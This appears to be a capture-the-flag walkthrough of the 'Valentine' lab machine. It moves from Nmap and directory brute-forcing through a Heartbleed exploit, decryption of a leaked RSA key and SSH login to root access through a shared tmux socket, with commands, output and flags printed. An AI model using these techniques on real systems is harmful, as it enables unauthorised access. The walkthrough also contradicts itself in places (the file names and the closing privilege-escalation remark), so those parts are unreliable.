
---

## Nmap Enumeration

Initial scan to identify open ports and services:

```bash
nmap -sV -sC valentine.htb
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.2.22
```

- Web server is running on both HTTP and HTTPS.
- SSL cert is expired and self-signed.
- SSH version is old and likely vulnerable to known exploits.
- Apache version is also outdated.

---
## Heartbleed Exploit (CVE-2014-0160)

Because OpenSSL is used for HTTPS and the version is vulnerable, we try the Heartbleed exploit:

```bash
searchsploit -m exploits/multiple/remote/32745.py
python2 32745.py valentine.htb
```

Output snippet:

```
...
0140: $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

Base64 decode:

```bash
echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
```

Result:

```
heartbleedbelievethehype
```

We now have the RSA key passphrase.

---

## Feroxbuster Directory Bruteforce

Using `feroxbuster` to enumerate paths on the web server:

```bash
feroxbuster -u http://valentine.htb -w /usr/share/wordlists/seclists/PathBANGER.txt -x php,sh,txt -C 404
```

Relevant hits:

```
/index
/index.php
/dev/
/dev/notes.txt
/dev/hype_key
/decode
/decode.php
/encode
/encode.php
/omg
/omg.jpg
```

---

## Notes Discovery

Visiting `/dev/notes.txt` reveals:

```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

This implies the encoder/decoder may leak sensitive data. Might not be properly secured yet.

---

## Leaked RSA Key (Hex Encoded)

Visiting `/dev/hype_key` gives a hex blob. Download and convert:

```bash
wget https://valentine.htb/dev/hype_key --no-check-certificate
cat hype_key | xxd -r -p > rsa.enc
```

Result is:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3

-----END RSA PRIVATE KEY-----
```

It’s encrypted — we need the passphrase.

---

## Encoder/Decoder Discovery

- `/encode.php` and `/decode.php` appear functional.
- Based on the notes, encoding/decoding is supposed to be client-side but currently isn’t.
- These endpoints accept POST requests and reflect encoded/decoded content.

---

## Decrypting the Private Key

```bash
openssl rsa -in hype_key -out hype_key_decrypted_unencrypted.key
```

Enter the passphrase when prompted:

```
heartbleedbelievethehype
```

Successful decryption gives a usable private key.

---

## SSH Access

Make the key secure and connect:

```bash
chmod 600 hype_key_decrypted_unencrypted.key
ssh -i hype_key_decrypted_unencrypted.key \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -o HostkeyAlgorithms=+ssh-rsa \
  hype@valentine.htb
# password: heartbleedbelievethehype
```

We gain shell access as user `hype`.

```
hype@Valentine:~$ cat user.txt
bf7eb8c600515cbb9fef7f2fde9a0773
```

```
ls -l /.devs
srw-rw---- 1 root hype 0 Apr 17 17:12 dev_sess
```
It’s a UNIX domain socket. Let's see what’s using it:
```
ps aux | grep dev_sess
root       1057  0.0  0.1  26416  1672 ?        Ss   17:12   0:01 /usr/bin/tmux -S /.devs/dev_sess
```
It’s a `tmux` session running as root, but the socket is readable by our `hype` user.

```
tmux -S /.devs/dev_sess attach
```

```
root@Valentine:/# whoami
root
cd /root
ls
# curl.sh  root.txt
cat root.txt
# 59485c3f0d079b8911b150465e749403
```
---
## Summary

| Step | Action |
|------|--------|
| 1 | Scanned with Nmap and discovered outdated Apache & OpenSSH |
| 2 | Enumerated web dirs with Feroxbuster and found notes, key, encode/decode pages |
| 3 | Found `/dev/hype_key` containing hex-encoded encrypted private key |
| 4 | Exploited Heartbleed to leak memory from HTTPS |
| 5 | Retrieved RSA key passphrase: `heartbleedbelievethehype` |
| 6 | Decrypted private key and SSH’d into the machine as user `hype` |

Next step would be local enumeration and privilege escalation to root.
